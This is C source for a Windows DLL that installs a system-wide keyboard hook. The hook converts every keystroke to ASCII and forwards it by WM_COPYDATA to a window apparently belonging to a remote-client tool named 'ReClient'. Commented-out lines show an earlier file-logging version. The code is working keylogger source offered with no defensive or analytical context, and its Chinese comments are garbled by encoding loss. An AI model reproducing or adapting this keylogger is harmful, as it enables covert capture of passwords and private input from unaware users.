#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include "kbh.h"

static HINSTANCE hInst;
static FILE *f1;
static HHOOK hhook;

static char szbuf[256] = { 0 };

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// DLL ��ʼ������
		hInst = hModule;
		break;

	case DLL_PROCESS_DETACH:
		// DLL ������
		break;

	default:
		break;
	}

	return TRUE;
}




LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam/*�������*/, LPARAM lParam)
{
	// �������¼�
	// ...

	
	char ch;
	UINT scan = 0;
	WORD w;//����ת��Ϊascil���ַ�
	if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
	{
		//0x2f ���µĶ��ǿ��Ƽ�
		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || ((wParam >= 0x2f) && (wParam <= 0x100)))
		{
			//f1 = fopen("c:\\export.txt", "a+");
			if (wParam == VK_RETURN)//�س� ��¼
			{
				ch = '\n';
				//fwrite(&ch, 1, 1, f1);
				memset(szbuf, 0, 256);
				*szbuf = ch;
				//MessageBox(0,szbuf,"ch",0);
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);//��ѯ����״̬
				ToAscii(wParam, scan, ks, &w, 0);
				ch = (char)w;
				memset(szbuf, 0, 256);
				*szbuf = ch;

				COPYDATASTRUCT cds;

				cds.dwData = 0;
				cds.lpData = szbuf;
				cds.cbData = strlen(szbuf)+1;

				HWND  hwnd=FindWindowExA(NULL,NULL,"RECLIENTKBHCMD","ReClient_KBH_CMD");

				int nRet;

				nRet=SendMessage(hwnd,
					WM_COPYDATA,
					(WPARAM)NULL,
					(LPARAM)&cds
				);
				//MessageBox(0, szbuf, "ch", 0);
				//fwrite(&ch, 1, 1, f1);
			}
			//fclose(f1);
		}
	}

	

	// ������һ�����Ӵ����������¼����ݸ���һ�����ӻ�Ĭ�ϴ�����
	return CallNextHookEx(hhook, nCode, wParam, lParam);
}

EXPORT void SetKbHook(void)
{
	hhook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hInst, (DWORD)NULL);//�����н����¹���
}